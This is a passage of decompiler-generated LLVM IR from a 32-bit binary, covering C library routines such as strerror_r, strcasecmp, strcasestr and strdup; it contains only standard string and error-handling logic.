  %v0_805cec1 = phi i32 [ %v0_805cedb, %dec_label_pc_805cebd.preheader ], [ %v1_805cead, %dec_label_pc_805cead ], [ %v1_805ceb9, %dec_label_pc_805ceb9 ]
  %v1_805cec1 = add i32 %v0_805cec1, 1
  br label %dec_label_pc_805cec8

dec_label_pc_805cec8:                             ; preds = %dec_label_pc_805ce95, %dec_label_pc_805cec1
  %v0_805cebd27.in.in.in = phi i32 [ %v1_805cec1, %dec_label_pc_805cec1 ], [ %v1_805ce95, %dec_label_pc_805ce95 ]
  %v0_805cedb = phi i32 [ %v1_805cec1, %dec_label_pc_805cec1 ], [ %v1_805ce95, %dec_label_pc_805ce95 ]
  %v0_805cebd27.in.in = inttoptr i32 %v0_805cebd27.in.in.in to i8*
  %v0_805cebd27.in = load i8, i8* %v0_805cebd27.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_805cebd27.in, %v3_805ce8a
  %v1_805cec8 = icmp eq i1 %storemerge4, false
  br i1 %v1_805cec8, label %dec_label_pc_805cebd.preheader, label %dec_label_pc_805ceca

dec_label_pc_805ceca:                             ; preds = %dec_label_pc_805cec8
  %v1_805ced2 = add i32 %v0_805cedb, 1
  %v2_805ced2 = inttoptr i32 %v1_805ced2 to i8*
  %v3_805ced2 = load i8, i8* %v2_805ced2, align 1
  %v3_805ced6 = load i8, i8* %v2_805ced6, align 1
  %v1_805cede = add i32 %v0_805cedb, -1
  %v12_805cee1 = icmp eq i8 %v3_805ced2, %v3_805ced6
  %v1_805cee3 = icmp eq i1 %v12_805cee1, false
  br i1 %v1_805cee3, label %dec_label_pc_805cf0d, label %dec_label_pc_805cee5.preheader

dec_label_pc_805cee5.preheader:                   ; preds = %dec_label_pc_805ceca
  %v1_805cee510 = icmp eq i8 %v3_805ced2, 0
  br i1 %v1_805cee510, label %dec_label_pc_805cf17, label %dec_label_pc_805cee9

dec_label_pc_805cee9:                             ; preds = %dec_label_pc_805cee5.preheader, %dec_label_pc_805cf09
  %v0_805cefc = phi i32 [ %v1_805cefc, %dec_label_pc_805cf09 ], [ %v1_805ced6, %dec_label_pc_805cee5.preheader ]
  %v0_805cef9 = phi i32 [ %v1_805cef9, %dec_label_pc_805cf09 ], [ %v1_805ced2, %dec_label_pc_805cee5.preheader ]
  %v1_805cee9 = add i32 %v0_805cef9, 1
  %v2_805cee9 = inttoptr i32 %v1_805cee9 to i8*
  %v3_805cee9 = load i8, i8* %v2_805cee9, align 1
  %v1_805ceed = add i32 %v0_805cefc, 1
  %v2_805ceed = inttoptr i32 %v1_805ceed to i8*
  %v3_805ceed = load i8, i8* %v2_805ceed, align 1
  %v12_805cef1 = icmp eq i8 %v3_805cee9, %v3_805ceed
  %v1_805cef3 = icmp eq i1 %v12_805cef1, false
  br i1 %v1_805cef3, label %dec_label_pc_805cf0d, label %dec_label_pc_805cef5

dec_label_pc_805cef5:                             ; preds = %dec_label_pc_805cee9
  %v1_805cef5 = icmp eq i8 %v3_805ceed, 0
  br i1 %v1_805cef5, label %dec_label_pc_805cf17, label %dec_label_pc_805cef9

dec_label_pc_805cef9:                             ; preds = %dec_label_pc_805cef5
  %v1_805cef9 = add i32 %v0_805cef9, 2
  %v1_805cefc = add i32 %v0_805cefc, 2
  %v1_805ceff = inttoptr i32 %v1_805cef9 to i8*
  %v2_805ceff = load i8, i8* %v1_805ceff, align 1
  %v1_805cf02 = inttoptr i32 %v1_805cefc to i8*
  %v2_805cf02 = load i8, i8* %v1_805cf02, align 1
  %v12_805cf05 = icmp eq i8 %v2_805ceff, %v2_805cf02
  %v1_805cf07 = icmp eq i1 %v12_805cf05, false
  br i1 %v1_805cf07, label %dec_label_pc_805cf0d, label %dec_label_pc_805cf09

dec_label_pc_805cf09:                             ; preds = %dec_label_pc_805cef9
  %v1_805cee5 = icmp eq i8 %v2_805cf02, 0
  br i1 %v1_805cee5, label %dec_label_pc_805cf17, label %dec_label_pc_805cee9

dec_label_pc_805cf0d:                             ; preds = %dec_label_pc_805cef9, %dec_label_pc_805cee9, %dec_label_pc_805ceca
  %v0_805cf0d.in = phi i8 [ %v3_805ced6, %dec_label_pc_805ceca ], [ %v2_805cf02, %dec_label_pc_805cef9 ], [ %v3_805ceed, %dec_label_pc_805cee9 ]
  %v1_805cf0d = icmp eq i8 %v0_805cf0d.in, 0
  %v1_805cf0f = icmp eq i1 %v1_805cf0d, false
  br i1 %v1_805cf0f, label %dec_label_pc_805cea0, label %dec_label_pc_805cf17

dec_label_pc_805cf15:                             ; preds = %dec_label_pc_805ce73, %dec_label_pc_805ceb5, %dec_label_pc_805cea9
  %v2_805cf1837 = phi i32 [ %v1_805ce83, %dec_label_pc_805cea9 ], [ %v1_805ce83, %dec_label_pc_805ceb5 ], [ %tmp41, %dec_label_pc_805ce73 ]
  br label %dec_label_pc_805cf17

dec_label_pc_805cf17:                             ; preds = %dec_label_pc_805cee5.preheader, %dec_label_pc_805cf0d, %dec_label_pc_805cef5, %dec_label_pc_805cf09, %entry, %dec_label_pc_805ce83, %dec_label_pc_805cf15
  %v2_805cf18 = phi i32 [ %v2_805cf1837, %dec_label_pc_805cf15 ], [ %v1_805ce83, %dec_label_pc_805ce83 ], [ %tmp41, %entry ], [ %v1_805ce83, %dec_label_pc_805cf09 ], [ %v1_805ce83, %dec_label_pc_805cef5 ], [ %v1_805ce83, %dec_label_pc_805cf0d ], [ %v1_805ce83, %dec_label_pc_805cee5.preheader ]
  %storemerge2 = phi i32 [ 0, %dec_label_pc_805cf15 ], [ %v1_805ce73, %dec_label_pc_805ce83 ], [ %arg1, %entry ], [ %v1_805cede, %dec_label_pc_805cf09 ], [ %v1_805cede, %dec_label_pc_805cef5 ], [ %v1_805cede, %dec_label_pc_805cf0d ], [ %v1_805cede, %dec_label_pc_805cee5.preheader ]
  store i32 %v2_805cf18, i32* @ecx, align 4
  store i32 %v0_805ce5b, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_805cf02, { 0, 2, 1 }
  uselistorder i32 %v1_805cefc, { 1, 0 }
  uselistorder i32 %v1_805cef9, { 1, 0 }
  uselistorder i8 %v3_805ceed, { 0, 2, 1 }
  uselistorder i8 %v3_805ced2, { 1, 0 }
  uselistorder i32 %v0_805cedb, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_805cec1, { 1, 0 }
  uselistorder i8 %v2_805ceba, { 1, 0 }
  uselistorder i32 %v1_805ceb9, { 0, 2, 1 }
  uselistorder i8 %v2_805ceae, { 1, 0 }
  uselistorder i32 %v0_805cead60, { 1, 0 }
  uselistorder i32 %v1_805ce95, { 1, 0 }
  uselistorder i32 %v1_805ce83, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32 %v1_805ce73, { 0, 2, 1 }
  uselistorder i8 %v2_805ce67, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp41, { 1, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805cf17, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_805cf15, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805cee9, { 1, 0 }
  uselistorder label %dec_label_pc_805cec8, { 1, 0 }
  uselistorder label %dec_label_pc_805cea9, { 1, 0 }
  uselistorder label %dec_label_pc_805cebd.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805cf20 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v3_805cf31 = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_805cf36 = load i32, i32* @ebx, align 4
  store i32 %v0_805cf20, i32* @ebx, align 4
  ret i32 %v0_805cf36
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  %v0_805cf40 = load i32, i32* @ebp, align 4
  %v0_805cf41 = load i32, i32* @edi, align 4
  %v0_805cf42 = load i32, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805cf52 = icmp ugt i32 %arg1, 124
  br i1 %v6_805cf52, label %dec_label_pc_805cf6f, label %dec_label_pc_805cf54

dec_label_pc_805cf54:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_806cbc0.711 to i32), i32* @esi, align 4
  %v1_805cf644 = icmp eq i32 %arg1, 0
  %v1_805cf6611 = icmp eq i1 %v1_805cf644, false
  br i1 %v1_805cf6611, label %dec_label_pc_805cf5d, label %dec_label_pc_805cf68

dec_label_pc_805cf5d:                             ; preds = %dec_label_pc_805cf54, %dec_label_pc_805cf5d
  %v0_805cf60 = phi i32 [ %v3_805cf60, %dec_label_pc_805cf5d ], [ %arg1, %dec_label_pc_805cf54 ]
  %v0_805cf63 = phi i32 [ %v1_805cf63, %dec_label_pc_805cf5d ], [ ptrtoint ([8 x i8]* @global_var_806cbc0.711 to i32), %dec_label_pc_805cf54 ]
  %v1_805cf5d = inttoptr i32 %v0_805cf63 to i8*
  %v2_805cf5d = load i8, i8* %v1_805cf5d, align 1
  %v7_805cf5d = icmp eq i8 %v2_805cf5d, 0
  %v2_805cf60 = zext i1 %v7_805cf5d to i32
  %v3_805cf60 = add i32 %v2_805cf60, %v0_805cf60
  %v16_805cf60 = icmp eq i32 %v3_805cf60, 0
  %v1_805cf63 = add i32 %v0_805cf63, 1
  store i32 %v1_805cf63, i32* @esi, align 4
  %v1_805cf66 = icmp eq i1 %v16_805cf60, false
  br i1 %v1_805cf66, label %dec_label_pc_805cf5d, label %dec_label_pc_805cf68

dec_label_pc_805cf68:                             ; preds = %dec_label_pc_805cf5d, %dec_label_pc_805cf54
  %v0_805cf6a = phi i32 [ ptrtoint ([8 x i8]* @global_var_806cbc0.711 to i32), %dec_label_pc_805cf54 ], [ %v1_805cf63, %dec_label_pc_805cf5d ]
  store i32 0, i32* @ebp, align 4
  %v1_805cf6a = inttoptr i32 %v0_805cf6a to i8*
  %v2_805cf6a = load i8, i8* %v1_805cf6a, align 1
  %v3_805cf6a = icmp eq i8 %v2_805cf6a, 0
  %v1_805cf6d = icmp eq i1 %v3_805cf6a, false
  br i1 %v1_805cf6d, label %dec_label_pc_805cf68.dec_label_pc_805cf9e_crit_edge, label %dec_label_pc_805cf6f

dec_label_pc_805cf68.dec_label_pc_805cf9e_crit_edge: ; preds = %dec_label_pc_805cf68
  br label %dec_label_pc_805cf9e

dec_label_pc_805cf6f:                             ; preds = %dec_label_pc_805cf68, %entry
  store i32 22, i32* @ebp, align 4
  %v1_805cf77 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_805cf83 = bitcast i32* %stack_var_-17 to i8*
  %v7_805cf83 = call i32 @_uintmaxtostr(i8* %v6_805cf83, i32 %arg1, i32 %v1_805cf77, i32 -10, i32 0)
  %v1_805cf8b = add i32 %v7_805cf83, -14
  store i32 %v1_805cf8b, i32* @esi, align 4
  %v5_805cf95 = inttoptr i32 %v1_805cf8b to i8*
  store i8* %v5_805cf95, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805cf8b to i16*
  %v6_805cf96 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_806cbaa.712 to i32), i32 14)
  %v0_805cfad.pre = load i32, i32* @edi, align 4
  %v0_805cfaf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805cf9e

dec_label_pc_805cf9e:                             ; preds = %dec_label_pc_805cf68.dec_label_pc_805cf9e_crit_edge, %dec_label_pc_805cf6f
  %v0_805cfaf = phi i32 [ %v0_805cf6a, %dec_label_pc_805cf68.dec_label_pc_805cf9e_crit_edge ], [ %v0_805cfaf.pre, %dec_label_pc_805cf6f ]
  %v0_805cfad = phi i32 [ %arg3, %dec_label_pc_805cf68.dec_label_pc_805cf9e_crit_edge ], [ %v0_805cfad.pre, %dec_label_pc_805cf6f ]
  %v4_805cfa0 = icmp eq i32 %arg2, 0
  %v1_805cfa5 = icmp eq i1 %v4_805cfa0, false
  %v2_805cfad = select i1 %v1_805cfa5, i32 %v0_805cfad, i32 0
  store i32 %v2_805cfad, i32* @edi, align 4
  %v5_805cfaf = inttoptr i32 %v0_805cfaf to i8*
  store i8* %v5_805cfaf, i8** %stack_var_-108, align 4
  %v3_805cfb0 = call i32 @strlen(i8* %v5_805cfaf)
  %v1_805cfb8 = add i32 %v3_805cfb0, 1
  store i32 %v1_805cfb8, i32* %ebx.global-to-local, align 4
  %v1_805cfbb = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_805cfb8, %v1_805cfbb
  br i1 %tmp, label %dec_label_pc_805cfbf, label %dec_label_pc_805cfc6

dec_label_pc_805cfbf:                             ; preds = %dec_label_pc_805cf9e
  store i32 %v1_805cfbb, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_805cfc6

dec_label_pc_805cfc6:                             ; preds = %dec_label_pc_805cf9e, %dec_label_pc_805cfbf
  %v0_805cfcb = phi i32 [ %v1_805cfb8, %dec_label_pc_805cf9e ], [ %v1_805cfbb, %dec_label_pc_805cfbf ]
  %v1_805cfc6 = icmp eq i32 %v0_805cfcb, 0
  br i1 %v1_805cfc6, label %dec_label_pc_805cfe2, label %dec_label_pc_805cfca

dec_label_pc_805cfca:                             ; preds = %dec_label_pc_805cfc6
  %v0_805cfcc = load i32, i32* @esi, align 4
  %v8_805cfcd = inttoptr i32 %arg2 to i8*
  store i8* %v8_805cfcd, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_805cfd1 = call i32 @memcpy(i16* %tmp45, i32 %v0_805cfcc, i32 %v0_805cfcb)
  %v1_805cfdd = load i32, i32* %ebx.global-to-local, align 4
  %v2_805cfdd = add i32 %arg2, -1
  %v3_805cfdd = add i32 %v2_805cfdd, %v1_805cfdd
  %v4_805cfdd = inttoptr i32 %v3_805cfdd to i8*
  store i8 0, i8* %v4_805cfdd, align 1
  br label %dec_label_pc_805cfe2

dec_label_pc_805cfe2:                             ; preds = %dec_label_pc_805cfc6, %dec_label_pc_805cfca
  %v0_805cfe2 = load i32, i32* @ebp, align 4
  %v1_805cfe2 = icmp eq i32 %v0_805cfe2, 0
  br i1 %v1_805cfe2, label %dec_label_pc_805cfed, label %dec_label_pc_805cfe6

dec_label_pc_805cfe6:                             ; preds = %dec_label_pc_805cfe2
  %v0_805cfe6 = load i8*, i8** %stack_var_-108, align 4
  %v1_805cfe6 = ptrtoint i8* %v0_805cfe6 to i32
  %v2_805cfe6 = call i32 @__errno_location(i32 %v1_805cfe6)
  %v0_805cfeb = load i32, i32* @ebp, align 4
  %v2_805cfeb = inttoptr i32 %v2_805cfe6 to i32*
  store i32 %v0_805cfeb, i32* %v2_805cfeb, align 4
  %v0_805cff0.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805cfed

dec_label_pc_805cfed:                             ; preds = %dec_label_pc_805cfe2, %dec_label_pc_805cfe6
  %v0_805cff0 = phi i32 [ 0, %dec_label_pc_805cfe2 ], [ %v0_805cff0.pre, %dec_label_pc_805cfe6 ]
  store i32 %v0_805cf42, i32* @esi, align 4
  store i32 %v0_805cf41, i32* @edi, align 4
  store i32 %v0_805cf40, i32* @ebp, align 4
  ret i32 %v0_805cff0

; uselistorder directives
  uselistorder i32 %v1_805cfbb, { 1, 2, 0 }
  uselistorder i32 %v1_805cfb8, { 1, 0, 2 }
  uselistorder i32 %v1_805cf8b, { 1, 0, 2 }
  uselistorder i32 %v1_805cf63, { 0, 2, 1 }
  uselistorder i32 %v3_805cf60, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_806cbc0.711 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805cfed, { 1, 0 }
  uselistorder label %dec_label_pc_805cfe2, { 1, 0 }
  uselistorder label %dec_label_pc_805cfc6, { 1, 0 }
  uselistorder label %dec_label_pc_805cf9e, { 1, 0 }
  uselistorder label %dec_label_pc_805cf5d, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805d008 = inttoptr i32 %arg2 to i8*
  %v3_805d008 = call i32 @memmove(i8* %v2_805d008, i32 %arg1)
  ret i32 %v3_805d008
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805d012 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d012, i32* @ecx, align 4
  %v0_805d01c = load i32, i32* bitcast (i32** @global_var_8074868.713 to i32*), align 8
  br label %dec_label_pc_805d022

dec_label_pc_805d022:                             ; preds = %dec_label_pc_805d03f, %entry
  %v0_805d0456 = phi i32 [ %v0_805d0457, %dec_label_pc_805d03f ], [ 0, %entry ]
  %v0_805d03f = phi i32 [ %v1_805d03f, %dec_label_pc_805d03f ], [ %arg2, %entry ]
  %v0_805d040 = phi i32 [ %v1_805d040, %dec_label_pc_805d03f ], [ %v4_805d012, %entry ]
  %v12_805d022 = icmp eq i32 %v0_805d040, %v0_805d03f
  %.pre = inttoptr i32 %v0_805d040 to i8*
  br i1 %v12_805d022, label %dec_label_pc_805d03a, label %dec_label_pc_805d026

dec_label_pc_805d026:                             ; preds = %dec_label_pc_805d022
  %v2_805d026 = load i8, i8* %.pre, align 1
  %v3_805d026 = zext i8 %v2_805d026 to i32
  %v2_805d029 = mul nuw nsw i32 %v3_805d026, 2
  %v3_805d029 = add i32 %v2_805d029, %v0_805d01c
  %v4_805d029 = inttoptr i32 %v3_805d029 to i16*
  %v5_805d029 = load i16, i16* %v4_805d029, align 2
  %v6_805d029 = sext i16 %v5_805d029 to i32
  %v1_805d02d = inttoptr i32 %v0_805d03f to i8*
  %v2_805d02d = load i8, i8* %v1_805d02d, align 1
  %v3_805d02d = zext i8 %v2_805d02d to i32
  %v2_805d030 = mul nuw nsw i32 %v3_805d02d, 2
  %v3_805d030 = add i32 %v2_805d030, %v0_805d01c
  %v4_805d030 = inttoptr i32 %v3_805d030 to i16*
  %v5_805d030 = load i16, i16* %v4_805d030, align 2
  %v6_805d030 = sext i16 %v5_805d030 to i32
  %v2_805d034 = sub nsw i32 %v6_805d029, %v6_805d030
  %v12_805d034 = icmp eq i32 %v2_805d034, 0
  store i32 %v2_805d034, i32* @edx, align 4
  %v1_805d038 = icmp eq i1 %v12_805d034, false
  br i1 %v1_805d038, label %dec_label_pc_805d043, label %dec_label_pc_805d03a

dec_label_pc_805d03a:                             ; preds = %dec_label_pc_805d022, %dec_label_pc_805d026
  %v0_805d0457 = phi i32 [ %v2_805d034, %dec_label_pc_805d026 ], [ %v0_805d0456, %dec_label_pc_805d022 ]
  %v2_805d03a = load i8, i8* %.pre, align 1
  %v3_805d03a = icmp eq i8 %v2_805d03a, 0
  br i1 %v3_805d03a, label %dec_label_pc_805d043, label %dec_label_pc_805d03f

dec_label_pc_805d03f:                             ; preds = %dec_label_pc_805d03a
  %v1_805d03f = add i32 %v0_805d03f, 1
  %v1_805d040 = add i32 %v0_805d040, 1
  store i32 %v1_805d040, i32* @ecx, align 4
  br label %dec_label_pc_805d022

dec_label_pc_805d043:                             ; preds = %dec_label_pc_805d03a, %dec_label_pc_805d026
  %v0_805d045 = phi i32 [ %v0_805d0457, %dec_label_pc_805d03a ], [ %v2_805d034, %dec_label_pc_805d026 ]
  ret i32 %v0_805d045

; uselistorder directives
  uselistorder i32 %v1_805d040, { 1, 0 }
  uselistorder i32 %v0_805d0457, { 1, 0 }
  uselistorder i32 %v2_805d034, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805d040, { 2, 1, 0 }
  uselistorder i32 %v0_805d03f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805d03a, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805d04b = load i32, i32* @ebx, align 4
  %v4_805d04f = ptrtoint i8* %arg1 to i32
  %v1_805d05b18 = inttoptr i32 %arg2 to i8*
  %v2_805d05b1931 = load i8, i8* %v1_805d05b18, align 1
  %v4_805d05d2335 = icmp eq i8 %v2_805d05b1931, 0
  %v1_805d05f2436 = icmp eq i1 %v4_805d05d2335, false
  br i1 %v1_805d05f2436, label %dec_label_pc_805d065.lr.ph.lr.ph, label %dec_label_pc_805d095

dec_label_pc_805d065.lr.ph.lr.ph:                 ; preds = %entry
  %v3_805d05b2032 = zext i8 %v2_805d05b1931 to i32
  %v4_805d05b.pre.pre = load i32, i32* @eax, align 4
  %v5_805d05b2133 = and i32 %v4_805d05b.pre.pre, -256
  %v6_805d05b2234 = or i32 %v3_805d05b2032, %v5_805d05b2133
  %v4_805d065.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805d065.lr.ph

dec_label_pc_805d065.lr.ph:                       ; preds = %dec_label_pc_805d065.lr.ph.lr.ph, %dec_label_pc_805d090
  %v4_805d065.pre = phi i32 [ %v4_805d065.pre.pre, %dec_label_pc_805d065.lr.ph.lr.ph ], [ %v0_805d072, %dec_label_pc_805d090 ]
  %v6_805d05b2239 = phi i32 [ %v6_805d05b2234, %dec_label_pc_805d065.lr.ph.lr.ph ], [ %v6_805d05b22, %dec_label_pc_805d090 ]
  %v2_805d05b1938 = phi i8 [ %v2_805d05b1931, %dec_label_pc_805d065.lr.ph.lr.ph ], [ %v2_805d05b19, %dec_label_pc_805d090 ]
  %v0_805d09037 = phi i32 [ %v4_805d04f, %dec_label_pc_805d065.lr.ph.lr.ph ], [ %v1_805d090, %dec_label_pc_805d090 ]
  br label %dec_label_pc_805d065

dec_label_pc_805d065:                             ; preds = %dec_label_pc_805d065.lr.ph, %dec_label_pc_805d085
  %v4_805d065 = phi i32 [ %v4_805d065.pre, %dec_label_pc_805d065.lr.ph ], [ %v4_805d06544, %dec_label_pc_805d085 ]
  %v6_805d05b29 = phi i32 [ %v6_805d05b2239, %dec_label_pc_805d065.lr.ph ], [ %v6_805d05b, %dec_label_pc_805d085 ]
  %v2_805d05b28 = phi i8 [ %v2_805d05b1938, %dec_label_pc_805d065.lr.ph ], [ %v2_805d05b, %dec_label_pc_805d085 ]
  %v1_805d05b27 = phi i8* [ %v1_805d05b18, %dec_label_pc_805d065.lr.ph ], [ %v1_805d05b, %dec_label_pc_805d085 ]
  %v0_805d08526 = phi i32 [ %arg2, %dec_label_pc_805d065.lr.ph ], [ %v1_805d085, %dec_label_pc_805d085 ]
  %v0_805d08625 = phi i32 [ %v0_805d09037, %dec_label_pc_805d065.lr.ph ], [ %v1_805d086, %dec_label_pc_805d085 ]
  %v1_805d065 = inttoptr i32 %v0_805d08625 to i8*
  %v2_805d065 = load i8, i8* %v1_805d065, align 1
  %v3_805d065 = zext i8 %v2_805d065 to i32
  %v5_805d065 = and i32 %v4_805d065, -256
  %v6_805d065 = or i32 %v5_805d065, %v3_805d065
  %v15_805d06b = icmp eq i8 %v2_805d05b28, %v2_805d065
  br i1 %v15_805d06b, label %dec_label_pc_805d085, label %dec_label_pc_805d06f

dec_label_pc_805d06f:                             ; preds = %dec_label_pc_805d065
  %v2_805d06f = load i8, i8* %v1_805d065, align 1
  %v3_805d06f = zext i8 %v2_805d06f to i32
  %v0_805d072 = load i32, i32* bitcast (i32** @global_var_8074868.713 to i32*), align 8
  %v2_805d078 = load i8, i8* %v1_805d05b27, align 1
  %v3_805d078 = zext i8 %v2_805d078 to i32
  store i32 %v3_805d078, i32* @ecx, align 4
  %v2_805d07b = mul nuw nsw i32 %v3_805d06f, 2
  %v3_805d07b = add i32 %v2_805d07b, %v0_805d072
  %v4_805d07b = inttoptr i32 %v3_805d07b to i16*
  %v5_805d07b = load i16, i16* %v4_805d07b, align 2
  %v6_805d07b = zext i16 %v5_805d07b to i32
  %v4_805d07f = mul nuw nsw i32 %v3_805d078, 2
  %v5_805d07f = add i32 %v4_805d07f, %v0_805d072
  %v6_805d07f = inttoptr i32 %v5_805d07f to i16*
  %v7_805d07f = load i16, i16* %v6_805d07f, align 2
  %v18_805d07f = icmp eq i16 %v5_805d07b, %v7_805d07f
  %v1_805d083 = icmp eq i1 %v18_805d07f, false
  br i1 %v1_805d083, label %dec_label_pc_805d089, label %dec_label_pc_805d085

dec_label_pc_805d085:                             ; preds = %dec_label_pc_805d06f, %dec_label_pc_805d065
  %v4_805d06544 = phi i32 [ %v0_805d072, %dec_label_pc_805d06f ], [ %v6_805d065, %dec_label_pc_805d065 ]
  %v4_805d05b6 = phi i32 [ %v6_805d07b, %dec_label_pc_805d06f ], [ %v6_805d05b29, %dec_label_pc_805d065 ]
  %v1_805d085 = add i32 %v0_805d08526, 1
  %v1_805d086 = add i32 %v0_805d08625, 1
  %v1_805d05b = inttoptr i32 %v1_805d085 to i8*
  %v2_805d05b = load i8, i8* %v1_805d05b, align 1
  %v3_805d05b = zext i8 %v2_805d05b to i32
  %v5_805d05b = and i32 %v4_805d05b6, -256
  %v6_805d05b = or i32 %v3_805d05b, %v5_805d05b
  %v4_805d05d = icmp eq i8 %v2_805d05b, 0
  %v1_805d05f = icmp eq i1 %v4_805d05d, false
  br i1 %v1_805d05f, label %dec_label_pc_805d065, label %dec_label_pc_805d095

dec_label_pc_805d089:                             ; preds = %dec_label_pc_805d06f
  %v4_805d089 = icmp eq i8 %v2_805d065, 0
  br i1 %v4_805d089, label %dec_label_pc_805d093, label %dec_label_pc_805d090

dec_label_pc_805d090:                             ; preds = %dec_label_pc_805d089
  %v1_805d090 = add i32 %v0_805d09037, 1
  %v2_805d05b19 = load i8, i8* %v1_805d05b18, align 1
  %v3_805d05b20 = zext i8 %v2_805d05b19 to i32
  %v5_805d05b21 = and i32 %v6_805d07b, 65280
  %v6_805d05b22 = or i32 %v3_805d05b20, %v5_805d05b21
  %v4_805d05d23 = icmp eq i8 %v2_805d05b19, 0
  %v1_805d05f24 = icmp eq i1 %v4_805d05d23, false
  br i1 %v1_805d05f24, label %dec_label_pc_805d065.lr.ph, label %dec_label_pc_805d095

dec_label_pc_805d093:                             ; preds = %dec_label_pc_805d089
  br label %dec_label_pc_805d095

dec_label_pc_805d095:                             ; preds = %dec_label_pc_805d090, %entry, %dec_label_pc_805d085, %dec_label_pc_805d093
  %storemerge = phi i32 [ 0, %dec_label_pc_805d093 ], [ %v4_805d04f, %entry ], [ %v1_805d090, %dec_label_pc_805d090 ], [ %v0_805d09037, %dec_label_pc_805d085 ]
  store i32 %v0_805d04b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805d05b19, { 1, 2, 0 }
  uselistorder i8 %v2_805d05b, { 1, 2, 0 }
  uselistorder i8* %v1_805d05b, { 1, 0 }
  uselistorder i32 %v0_805d072, { 1, 2, 3, 0 }
  uselistorder i8 %v2_805d065, { 1, 0, 2 }
  uselistorder i32 %v0_805d08625, { 1, 0 }
  uselistorder i8 %v2_805d05b1931, { 0, 2, 1 }
  uselistorder i8* %v1_805d05b18, { 2, 1, 0 }
  uselistorder i32 65280, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_805d095, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805d065, { 1, 0 }
  uselistorder label %dec_label_pc_805d065.lr.ph, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805d09c = load i32, i32* @edi, align 4
  %v0_805d09d = load i32, i32* @esi, align 4
  %v0_805d09e = load i32, i32* @ebx, align 4
  store i32 %v0_805d09e, i32* %stack_var_-12, align 4
  %v4_805d09f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805d09f, i32* @edi, align 4
  %v3_805d0a7 = call i32 @strlen(i8* %arg1)
  %v1_805d0ac = add i32 %v3_805d0a7, 1
  store i32 %v1_805d0ac, i32* @esi, align 4
  %v2_805d0b2 = call i32 @malloc(i32 %v1_805d0ac)
  store i32 %v2_805d0b2, i32* %ebx.global-to-local, align 4
  %v1_805d0bc = icmp eq i32 %v2_805d0b2, 0
  br i1 %v1_805d0bc, label %dec_label_pc_805d0cc, label %dec_label_pc_805d0c0

dec_label_pc_805d0c0:                             ; preds = %entry
  %v0_805d0c1 = load i32, i32* @esi, align 4
  %v0_805d0c2 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_805d0b2 to i16*
  %v6_805d0c4 = call i32 @memcpy(i16* %tmp11, i32 %v0_805d0c2, i32 %v0_805d0c1)
  %v0_805d0cc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d0cc

dec_label_pc_805d0cc:                             ; preds = %entry, %dec_label_pc_805d0c0
  %v0_805d0cc = phi i32 [ 0, %entry ], [ %v0_805d0cc.pre, %dec_label_pc_805d0c0 ]
  %v2_805d0ce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805d0ce, i32* @ebx, align 4
  store i32 %v0_805d09d, i32* @esi, align 4
  store i32 %v0_805d09c, i32* @edi, align 4
  ret i32 %v0_805d0cc

; uselistorder directives
  uselistorder i32 %v2_805d0b2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805d0cc, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
